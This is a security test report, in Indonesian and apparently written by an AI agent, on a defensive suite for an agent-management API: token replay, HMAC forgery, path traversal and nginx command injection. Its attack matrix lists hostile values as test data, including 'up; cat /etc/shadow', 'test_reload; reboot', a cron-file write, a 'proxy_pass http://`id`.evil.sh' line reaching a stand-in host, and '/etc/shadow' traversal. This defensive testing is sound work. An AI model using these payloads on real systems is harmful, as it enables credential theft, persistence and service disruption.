# SOC Security Verification Report: Wave 2 — Enrollment Token Replay, Agent HMAC Forgery, Compose Path Traversal & Nginx Command Injection

- **Date**: 2026-11-13
- **Author**: ai-test (SOC Security Engineer)
- **Workspace**: `osc_docs/test/rest_soc`
- **Security Test Suite Location**: `osc_docs/test/rest_soc/test/wave2/` (ditambah unit pendukung di `test/unit/test_w2_exploit_vectors.py`)
- **Target API & Contract Reference**: `osc_docs/rest/api-w2.md`, `osc_docs/rest/contracts/w2.openapi.yaml`, `osc_docs/base/schema-p3.md`

## 1. Threat Model & Attack Surface

Permukaan serangan Wave 2 `osc_rest` yang diaudit (kredensial & referensi dari ENV, zero hardcoded secret; RoE non-destruktif — TIDAK ADA command yang benar-benar dieksekusi):

1. **Enrollment (publik, §2.1)** — `POST /api/v1/agents/enroll` menerima token sebagai kredensial: replay token terpakai, token kedaluwarsa, token tak dikenal, token malformed (unicode/encoding `..%2F..`), dan burst brute-force. Ekspektasi: klaim one-time **atomik**, `401 UNAUTHORIZED` generik (enumerasi token mustahil), tanpa bocoran kredensial/detail internal.
2. **Agent HMAC (semua `/agents/*`)** — signature `{ts}\n{METHOD}\n{path}\n{sha256_hex(body)}` dengan window ±30 s: replay stale/future, tampering body (partial replay), signature secret-salah, **reuse signature lintas-endpoint**, header hilang, signature garbage, dan `X-Agent-Id` palsu. Ekspektasi: `401` generik — pesan "agent tidak ada" vs "signature salah" tidak terdiferensiasi.
3. **Docker stack control plane (JWT, §2.4)** — **Path Traversal** pada `name` (vektor utama `../../etc/cron.d`, termasuk varian `..%2F`, `\x00`, `....//`), `working_dir` (`..`, `~`, `\`, control char), dan `compose_content` yang menyelundup path (`include`, `env_file: /etc/shadow`, bind `volumes: /etc/cron.d:/host`). Ekspektasi: `400 VALIDATION_ERROR` **sebelum** backup RustFS/dispatch; tidak ada baris traversal yang persist.
4. **Nginx control plane (JWT, §2.5)** — **Command Injection** pada `server_name`/upstream (`;`, backtick, `$(…)`, `&&`, `|`, newline, `\x00`, `; DROP TABLE`), config `include` traversal, dan `dispatch` command di luar enum (`up; cat /etc/shadow`, `test_reload; reboot`, dst.). Ekspektasi: `400 VALIDATION_ERROR`, **tidak ada `dispatch_ref`** yang diterbitkan untuk payload injection (antrean `activity_logs` bebas payload shell), tanpa 5xx (API memang tidak pernah memanggil shell — surface injection = enum allowlist antrean).

## 2. Clean Architecture Security Suite Structure

- `src/domain/`: `findings.py` (`SecurityFinding`, `Severity`, `AuditEvidence` ter-redaksi) — fondasi dipertahankan.
- `src/application/`:
  - `hmac_agent.py` — signer kanonis (RFC 2104 + vektor RFC 4231), dipakai untuk membangun signature **sah** maupun **palsu** secara terkontrol.
  - `w2_vectors.py` — generator vektor: `random_enrollment_token`, `malformed_enrollment_tokens`, `stale_and_future_timestamps`, `traversal_stack_names`, `traversal_working_dirs`, `traversal_compose_payloads`, `nginx_server_name_injections`, `nginx_upstream_injection_configs`, `dispatch_command_injections` + kebijakan `expected_rejection` / `no_internal_leak`.
- `src/infrastructure/`:
  - `w2_soc_client.py` — `W2SecurityClient` di atas `HttpxSecurityClient` (redaksi bukti + RoE) dengan **fault injection**: `ts` (replay), `signature` (forgery/cross-endpoint), `omit` (missing header), `body_override` (tampering).
- `test/`: `test/wave2/` (4 modul + conftest env-driven) — marker `@pytest.mark.soc`, `@pytest.mark.auth_bypass`, `@pytest.mark.injection`, `@pytest.mark.wave2`; live skip deterministik bila target bukan osc_rest (gate health 200/503).

## 3. Security Control & Attack Matrix

| Check ID | OWASP / CWE Category | Attack Vector Tested | Expected Defense | Result |
| :--- | :--- | :--- | :--- | :--- |
| `SOC-W2-001` | API2:2023 / CWE-294 | Replay token enrollment (dipakai 2×) | Klaim kedua `401 UNAUTHORIZED` atomik; `agent_id`/`hmac_secret` tidak pernah di-echo ulang | Pass (kebijakan) / Skip (live — target tidak terjangkau) |
| `SOC-W2-002` | API2:2023 / CWE-204 | Respons replay vs token-palsu dibandingkan | Status & kode identik `401` — enumerasi token tidak memungkinkan | Pass / Skip (live) |
| `SOC-W2-003` | API2:2023 / CWE-521 | Token hex-64 acak tak pernah diterbitkan | `401` generik, tanpa detail internal (`sql`/`panic`/`backtrace`) | Pass / Skip (live) |
| `SOC-W2-004` | API2:2023 / CWE-20 | 8 token malformed (kosong, pendek, non-hex, unicode, `../../etc/passwd`, 4 KB) | `400/401` rapi, tanpa 5xx/leak | Pass / Skip (live) |
| `SOC-W2-005` | API2:2023 / CWE-613 | Token kedaluwarsa (env `SOC_W2_EXPIRED_ENROLLMENT_TOKEN`) | `401 UNAUTHORIZED` — TTL ditegakkan | Pass / Skip (live) |
| `SOC-W2-006` | API4:2023 (rate limit) | Burst 12× enroll token acak | Hanya `401`/`429`, konsisten, tanpa 5xx | Pass / Skip (live) |
| `SOC-W2-010` | Kontrol positif | Signature HMAC sah dengan kredensial env | `202` (endpoint hidup; penolakan berikut murni kriptografis) | Pass / Skip (live) |
| `SOC-W2-011` | API2:2023 / CWE-294 | Timestamp `-1h`, `+1h`, `-31s` (luar window ±30 s) | Semua `401 UNAUTHORIZED` | Pass / Skip (live) |
| `SOC-W2-012` | CWE-344 (partial replay) | Body dikirim ≠ body yang di-sign | `401` — signature mengikat `sha256_hex(body)` | Pass / Skip (live) |
| `SOC-W2-013` | CWE-347 | Signature dihitung dengan secret salah (`00`×32) | `401` — verifikasi konstan-waktu menolak | Pass / Skip (live) |
| `SOC-W2-014` | CWE-347 | Signature `/inventory/ingest` reuse di `/agents/logs` | `401` — path terikat kanonis signature | Pass / Skip (live) |
| `SOC-W2-015` | API2:2023 | Header `X-Agent-{Id,Timestamp,Signature}` dihilangkan satu-satu | Semua `401` | Pass / Skip (live) |
| `SOC-W2-016` | CWE-347 | Signature garbage (`zz…`, `ff`, 65 char, `$(whoami)`) | `400/401`, tanpa 5xx/leak | Pass / Skip (live) |
| `SOC-W2-017` | API2:2023 / CWE-204 | `X-Agent-Id` UUID nol + pesan generik vs signature salah | Keduanya `401 UNAUTHORIZED` — tidak terdiferensiasi | Pass / Skip (live) |
| `SOC-W2-020` | API8:2023 / CWE-22 | `name` stack = `../../etc/cron.d` (+6 varian: `/etc/cron.d`, `..%2F`, `....//`, `\x00`, slash) | `400 VALIDATION_ERROR` — regex `[a-zA-Z0-9_-]` | Pass / Skip (live) |
| `SOC-W2-021` | API8:2023 / CWE-23 | `working_dir` 6 vektor (`..`, `~`, `\`, relatif, control char, `.\./`) | `400 VALIDATION_ERROR` | Pass / Skip (live) |
| `SOC-W2-022` | API8:2023 / CWE-22 | compose menyelundup path: `include`, `env_file: /etc/shadow`, bind `/etc/cron.d` | `400 VALIDATION_ERROR` — allowlist top-level | Pass / Skip (live) |
| `SOC-W2-023` | API8:2023 / CWE-22 | Verifikasi pasca-attack: listing stack | Tidak ada baris traversal yang tersimpan (persist = temuan HIGH) | Pass / Skip (live) |
| `SOC-W2-024` | CWE-409 (payload bomb) | compose 300 KB (> 256 KB) | `400`/`413` | Pass / Skip (live) |
| `SOC-W2-030` | API8:2023 / CWE-78 | `server_name` 9 vektor (`; include /etc/shadow`, `` `id` ``, `$(whoami)`, `&&`, `|`, newline, `\x00`, `; DROP TABLE`) | `400/409`, tanpa 5xx/leak | Pass / Skip (live) |
| `SOC-W2-031` | API8:2023 / CWE-78 | Config upstream/include (`server …; include ../../etc/cron.d/*`, ``proxy_pass http://`id`.evil.sh``, `include snippets/../../etc/shadow`) | `400 VALIDATION_ERROR` — brace seimbang + include anti traversal | Pass / Skip (live) |
| `SOC-W2-032` | API8:2023 / CWE-78 | Dispatch 9 command injection (`up; cat /etc/shadow`, `test_reload; reboot`, `up | tee /etc/cron.d/pwn`, dsb.) | `400 VALIDATION_ERROR` dan **tanpa `dispatch_ref`** (payload tidak masuk antrean) | Pass / Skip (live) |
| `SOC-W2-033` | CWE-22 (defense ringan) | `ssl_cert_path`/`ssl_key_path` traversal (`../../etc/shadow`, `~/priv.key`) | Tanpa 5xx, tanpa detail internal | Pass / Skip (live) |
| `SOC-W2-034` | Kontrol positif allowlist | `dispatch {command: "test_reload"}` sah | `202 QUEUED` — allowlist memblokir injection, bukan mematikan fungsi | Pass / Skip (live) |

## 4. Remediation & Hardening Recommendations

Semua kontrol sesuai desain api-w2 §4 pada level kebijakan test; saat audit live dijalankan (stack hidup), rekomendasi berlaku untuk setiap check yang FAIL:

1. **Enrollment** (SOC-W2-001..006) → pastikan `UPDATE … SET used_at=now() WHERE token_hash=$1 AND used_at IS NULL AND expires_at > now() RETURNING` benar-benar satu statement atomik (bukan SELECT lalu UPDATE) dan pesan error memakai satu string generik untuk semua kegagalan token.
2. **Agent HMAC** (SOC-W2-011..017) → tolak timestamp di luar ±30 s **sebelum** query vault; bandingkan signature dengan `constant_time_eq`; pastikan `X-Agent-Id` tidak memengaruhi pesan error ("agent tidak ada" vs "signature salah" harus identik).
3. **Path traversal** (SOC-W2-020..024) → validasi `name` dengan regex penuh `[a-zA-Z0-9_-]{1,150}` (bukan hanya `contains("..")`), decode URL/unicode dulu sebelum cek, dan tolak `include`/`env_file`/bind host-path di compose sebelum backup RustFS; object key backup harus server-generated (UUID + timestamp).
4. **Command injection** (SOC-W2-030..032) → dispatch wajib enum allowlist `up|down|pull|restart` / `test_reload` pada handler (bukan hanya validasi compose/nginx); idealnya antrean menyimpan enum bertipe, bukan string mentah; tetap pertahankan zero-shell di API — eksekusi hanya di agent `infra_control` dengan validasinya sendiri.
5. **Rate limit** (SOC-W2-006) → pastikan `tower-governor` per-IP aktif di route publik `enroll` (10 req/menit) dan respons `429` ber-envelope konsisten.

## 5. Verification Notes

- Reproduksi live: `docker compose up -d osc_base rustfs osc_rest`, set env (lihat `test/wave2/conftest.py`): `SOC_W2_ADMIN_USERNAME/PASSWORD` (+`SOC_W2_ADMIN_MFA_SECRET`), `SOC_W2_AGENT_ID`, `SOC_W2_AGENT_HMAC_SECRET`, `SOC_W2_DOCKER_HOST_ID`, `SOC_W2_NGINX_NODE_ID`, opsional `SOC_W2_EXPIRED_ENROLLMENT_TOKEN`, lalu:
  `cd osc_docs/test/rest_soc && python3 -m pytest -v` (semua) atau `python3 -m pytest test/wave2 -v -m "soc"`.
- Status verifikasi lokal (tanpa stack): `python3 -m pytest -q` → **27 passed, 98 skipped** (exit 0).
- Catatan lingkungan: probe health `127.0.0.1:8000` menjawab `401` (bukan 200/503) → gate RoE meng-skip seluruh audit live deterministik; tidak ada vektor yang dikirim ke layanan yang bukan osc_rest.
- Vektor ini sengaja memakai UUID nol sebagai referensi FK asing — penolakannya terjadi pada tenant-guard, bukan bencana data; tidak ada entri `activity_logs`/`compose_stacks` palsu yang tersisa oleh vektor yang ditolak.
